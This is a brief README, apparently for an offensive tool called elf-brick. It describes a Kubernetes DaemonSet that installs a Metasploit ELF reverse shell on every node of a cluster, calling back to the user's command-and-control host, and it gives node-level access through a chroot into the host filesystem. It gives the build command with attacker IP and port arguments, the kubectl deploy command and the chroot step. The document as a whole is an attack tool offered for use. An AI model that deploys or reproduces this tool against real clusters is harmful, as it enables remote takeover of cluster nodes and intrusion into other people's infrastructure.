# elf-brick

Kubernetes Daemonset that deploys a Metasploit elf reverse shell back to your C&C and gives access to the underlying node.
The Daemonset will deploy a reverse shell per node.

## How to build

```sh
docker build -t elf-brick . --build-arg HOST="IP" --build-arg PORT="PORT"
```

### How to deploy

```sh
kubectl apply -f daemonset.yaml
```

#### Node

```sh
chroot /chroot
```

